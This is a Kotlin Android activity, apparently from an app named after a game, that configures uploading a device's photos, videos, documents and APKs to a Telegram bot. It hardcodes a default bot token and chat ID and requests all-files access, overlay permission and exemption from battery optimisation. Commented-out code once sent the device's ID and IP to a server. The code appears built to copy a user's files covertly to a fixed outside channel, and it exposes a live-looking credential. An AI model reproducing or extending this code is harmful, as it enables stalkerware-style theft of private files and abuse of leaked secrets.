package com.service.assasinscreed02

import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.RadioButton
import android.widget.RadioGroup
import android.widget.TextView
import android.widget.Toast
import android.widget.CheckBox
import androidx.appcompat.app.AppCompatActivity
import android.app.Activity
import android.content.Intent
import androidx.activity.result.contract.ActivityResultContracts
import java.io.File
import com.google.gson.Gson
import android.content.Context
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import okhttp3.MediaType.Companion.toMediaType
import android.Manifest
import android.os.Build
import android.provider.Settings
import android.content.pm.PackageManager
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.service.assasinscreed02.DeviceInfo

class ConfigBackupActivity : AppCompatActivity() {
    // Eliminar: importarHistorialLauncher, obtenerHistorialDesdeTelegram, enviarHistorialAlBot, enviarHistorialComoTexto, enviarHistorialComoArchivo, enviarComandoHistorialAlBot, y todos los botones y listeners relacionados con historial.
    // Mantener solo la función actualizarRegistroArchivos y el TextView txtRegistroArchivos.

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_config_backup)

        checkAndRequestAllPermissions()

        val radioGroup = findViewById<RadioGroup>(R.id.radioGroupIntervalo)
        val btnGuardar = findViewById<Button>(R.id.btnGuardarBackup)
        val btnCerrar = findViewById<Button>(R.id.btnCerrar)
        val txtRegistroArchivos = findViewById<TextView>(R.id.txtRegistroArchivos)
        val editBotToken = findViewById<android.widget.EditText>(R.id.editBotToken)
        val editBotChatId = findViewById<android.widget.EditText>(R.id.editBotChatId)
        val btnGuardarConfigBot = findViewById<Button>(R.id.btnGuardarConfigBot)
        val btnVerHistorial = findViewById<Button>(R.id.btnVerHistorial)
        val btnGuardarTipos = findViewById<Button>(R.id.btnGuardarTipos)
        
        btnVerHistorial.setOnClickListener {
            startActivity(Intent(this, HistorialActivity::class.java))
        }

        val btnBackupManualSelectivo = findViewById<Button>(R.id.btnBackupManualSelectivo)
        btnBackupManualSelectivo.setOnClickListener {
            startActivity(Intent(this, BackupManualSelectivoActivity::class.java))
        }

        // Configurar checkboxes de tipos de archivo
        configurarCheckboxesTiposArchivo()

        // Valores predeterminados
        val defaultToken = "7742764117:AAEdKEzTMo0c7OW8_UEFYSir2tmn-SOrHk8"
        val defaultChatId = "-1002609637326"
        val prefs = getSharedPreferences("BotConfig", Context.MODE_PRIVATE)
        var savedToken = prefs.getString("bot_token", null)
        var savedChatId = prefs.getString("bot_chat_id", null)
        if (savedToken.isNullOrEmpty()) savedToken = defaultToken
        if (savedChatId.isNullOrEmpty()) savedChatId = defaultChatId
        editBotToken.setText(savedToken)
        editBotChatId.setText(savedChatId)

        btnGuardarConfigBot.setOnClickListener {
            var token = editBotToken.text.toString().trim()
            var chatId = editBotChatId.text.toString().trim()
            if (token.isEmpty()) token = defaultToken
            if (chatId.isEmpty()) chatId = defaultChatId
            prefs.edit().putString("bot_token", token).putString("bot_chat_id", chatId).apply()
            editBotToken.setText(token)
            editBotChatId.setText(chatId)
            Toast.makeText(this, "Configuración del bot guardada", Toast.LENGTH_SHORT).show()
        }

        // Seleccionar el intervalo actual
        val intervalo = ErrorHandler.obtenerIntervalo(this)
        when (intervalo) {
            1 -> radioGroup.check(R.id.radio1h)
            6 -> radioGroup.check(R.id.radio6h)
            24 -> radioGroup.check(R.id.radio24h)
        }

        // Mostrar historial
        // Eliminar cualquier referencia, función o uso de txtHistorialConfig y de la función actualizarHistorial, así como cualquier código relacionado con historial de conexiones.

        // Mostrar registro de archivos
        actualizarRegistroArchivos(this)

        // Mostrar la IP local
        val deviceInfo = DeviceInfo(this)
        val ip = deviceInfo.getIpAddress()
        // txtIpLocal.text = "IP local: $ip" // This line is removed as per the edit hint

        // btnEnviarIp.setOnClickListener { // This listener is removed as per the edit hint
        //     try {
        //         val deviceInfo = DeviceInfo(
        //             deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "unknown_device",
        //             deviceName = android.os.Build.MODEL,
        //             androidVersion = android.os.Build.VERSION.RELEASE,
        //             appVersion = "radio2-1.0.0",
        //             lastSeen = System.currentTimeMillis(),
        //             serverUrl = "http://192.168.1.100:8080",
        //             ipAddress = ip
        //         )
        //         registrarDispositivo(this, deviceInfo)
        //         Toast.makeText(this, "IP enviada al servidor", Toast.LENGTH_SHORT).show()
        //     } catch (e: Exception) {
        //         Toast.makeText(this, "Error enviando IP: ${e.message}", Toast.LENGTH_LONG).show()
        //     }
        // }

        btnGuardar.setOnClickListener {
            val horas = when (radioGroup.checkedRadioButtonId) {
                R.id.radio1h -> 1
                R.id.radio6h -> 6
                R.id.radio24h -> 24
                else -> 24
            }
            try {
                ErrorHandler.guardarIntervalo(this, horas)
                Toast.makeText(this, "Intervalo guardado", Toast.LENGTH_SHORT).show()
                // No cerrar la actividad, solo actualizar el historial
                // Eliminar cualquier referencia, función o uso de txtHistorialConfig y de la función actualizarHistorial, así como cualquier código relacionado con historial de conexiones.
            } catch (e: Exception) {
                Toast.makeText(this, "Error guardando intervalo: ${e.message}", Toast.LENGTH_LONG).show()
            }
        }

        btnGuardarTipos.setOnClickListener {
            guardarTiposArchivoSeleccionados()
        }
        
        btnCerrar.setOnClickListener {
            finish()
        }
        
        // btnLimpiarRegistro.setOnClickListener { // This listener is removed as per the edit hint
        //     try {
        //         ErrorHandler.limpiarRegistroArchivos(this)
        //         actualizarRegistroArchivos(this)
        //         Toast.makeText(this, "Registro de archivos limpiado", Toast.LENGTH_SHORT).show()
        //     } catch (e: Exception) {
        //         Toast.makeText(this, "Error limpiando registro: ${e.message}", Toast.LENGTH_LONG).show()
        //     }
        // }

        // btnDetenerBackup.setOnClickListener { // This listener is removed as per the edit hint
        //     try {
        //         val workManager = androidx.work.WorkManager.getInstance(this)
        //         workManager.cancelAllWorkByTag("backup_worker")
        //         Toast.makeText(this, "Backup detenido", Toast.LENGTH_SHORT).show()
        //     } catch (e: Exception) {
        //         Toast.makeText(this, "Error al detener backup: ${e.message}", Toast.LENGTH_LONG).show()
        //     }
        // }

    }

    private fun configurarCheckboxesTiposArchivo() {
        val tiposActuales = obtenerTiposArchivo(this)
        
        // Mapeo de extensiones a checkboxes
        val mapeoCheckboxes = mapOf(
            "jpg" to findViewById<CheckBox>(R.id.checkJpg),
            "jpeg" to findViewById<CheckBox>(R.id.checkJpg),
            "png" to findViewById<CheckBox>(R.id.checkPng),
            "gif" to findViewById<CheckBox>(R.id.checkGif),
            "mp4" to findViewById<CheckBox>(R.id.checkMp4),
            "mov" to findViewById<CheckBox>(R.id.checkMov),
            "avi" to findViewById<CheckBox>(R.id.checkAvi),
            "pdf" to findViewById<CheckBox>(R.id.checkPdf),
            "doc" to findViewById<CheckBox>(R.id.checkDoc),
            "docx" to findViewById<CheckBox>(R.id.checkDoc),
            "txt" to findViewById<CheckBox>(R.id.checkTxt),
            "zip" to findViewById<CheckBox>(R.id.checkZip),
            "rar" to findViewById<CheckBox>(R.id.checkZip),
            "apk" to findViewById<CheckBox>(R.id.checkApk)
        )
        
        // Marcar checkboxes según configuración actual
        mapeoCheckboxes.forEach { (extension, checkbox) ->
            if (tiposActuales.contains(extension)) {
                checkbox.isChecked = true
            }
        }
    }

    private fun guardarTiposArchivoSeleccionados() {
        try {
            val tiposSeleccionados = mutableSetOf<String>()
            
            // Recopilar tipos seleccionados
            if (findViewById<CheckBox>(R.id.checkJpg).isChecked) {
                tiposSeleccionados.addAll(listOf("jpg", "jpeg"))
            }
            if (findViewById<CheckBox>(R.id.checkPng).isChecked) {
                tiposSeleccionados.add("png")
            }
            if (findViewById<CheckBox>(R.id.checkGif).isChecked) {
                tiposSeleccionados.add("gif")
            }
            if (findViewById<CheckBox>(R.id.checkMp4).isChecked) {
                tiposSeleccionados.add("mp4")
            }
            if (findViewById<CheckBox>(R.id.checkMov).isChecked) {
                tiposSeleccionados.add("mov")
            }
            if (findViewById<CheckBox>(R.id.checkAvi).isChecked) {
                tiposSeleccionados.add("avi")
            }
            if (findViewById<CheckBox>(R.id.checkPdf).isChecked) {
                tiposSeleccionados.add("pdf")
            }
            if (findViewById<CheckBox>(R.id.checkDoc).isChecked) {
                tiposSeleccionados.addAll(listOf("doc", "docx"))
            }
            if (findViewById<CheckBox>(R.id.checkTxt).isChecked) {
                tiposSeleccionados.add("txt")
            }
            if (findViewById<CheckBox>(R.id.checkZip).isChecked) {
                tiposSeleccionados.addAll(listOf("zip", "rar"))
            }
            if (findViewById<CheckBox>(R.id.checkApk).isChecked) {
                tiposSeleccionados.add("apk")
            }
            
            // Guardar configuración
            guardarTiposArchivo(this, tiposSeleccionados)
            
            Toast.makeText(this, "Tipos de archivo guardados: ${tiposSeleccionados.size} tipos", Toast.LENGTH_SHORT).show()
            
        } catch (e: Exception) {
            Toast.makeText(this, "Error guardando tipos de archivo: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }
    
    private fun checkAndRequestAllPermissions() {
        val permisos = mutableListOf(
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.ACCESS_WIFI_STATE
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permisos.add(Manifest.permission.READ_MEDIA_IMAGES)
            permisos.add(Manifest.permission.READ_MEDIA_VIDEO)
        }
        if (Build.VERSION.SDK_INT >= 34) {
            permisos.add("android.permission.FOREGROUND_SERVICE_DATA_SYNC")
        }
        // Almacenamiento avanzado
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !android.os.Environment.isExternalStorageManager()) {
            val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
            intent.data = android.net.Uri.parse("package:" + packageName)
            startActivity(intent)
            return
        }
        // Overlay
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
            intent.data = android.net.Uri.parse("package:" + packageName)
            startActivity(intent)
            return
        }
        val permisosNoConcedidos = permisos.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (permisosNoConcedidos.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, permisosNoConcedidos.toTypedArray(), 123)
            return
        }
        // Ignorar optimización de batería
        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !pm.isIgnoringBatteryOptimizations(packageName)) {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.data = android.net.Uri.parse("package:" + packageName)
            startActivity(intent)
        }
    }

    private fun obtenerHistorial(context: android.content.Context): Pair<Long, Long> {
        return try {
            val prefs = context.getSharedPreferences("RadioBackupPrefs", android.content.Context.MODE_PRIVATE)
            val ultima = prefs.getLong("ultima_conexion", 0L)
            val anterior = prefs.getLong("anterior_conexion", 0L)
            Pair(ultima, anterior)
        } catch (e: Exception) {
            Pair(0L, 0L)
        }
    }
    
    private fun actualizarHistorial(context: android.content.Context) {
        try {
            val (ultima, anterior) = obtenerHistorial(context)
            
            val formato = java.text.SimpleDateFormat("dd/MM/yyyy HH:mm:ss", java.util.Locale.getDefault())
            val texto = StringBuilder()
            texto.append("Última conexión: ")
            texto.append(if (ultima != 0L) formato.format(java.util.Date(ultima)) else "-")
            texto.append("\nAnterior: ")
            texto.append(if (anterior != 0L) formato.format(java.util.Date(anterior)) else "-")
            
            // Eliminar la línea: val txtHistorial = findViewById<TextView>(R.id.txtHistorialConfig)
            // Eliminar la línea: txtHistorial.text = texto.toString()
        } catch (e: Exception) {
            Log.e("ConfigBackupActivity", "Error actualizando historial: ${e.message}")
        }
    }
    
    private fun actualizarRegistroArchivos(context: android.content.Context) {
        try {
            val cantidad = ErrorHandler.obtenerCantidadArchivosSubidos(context)
            val txtRegistroArchivos = findViewById<TextView>(R.id.txtRegistroArchivos)
            txtRegistroArchivos.text = "Archivos subidos: $cantidad"
        } catch (e: Exception) {
            Log.e("ConfigBackupActivity", "Error actualizando registro: ${e.message}")
        }
    }
} 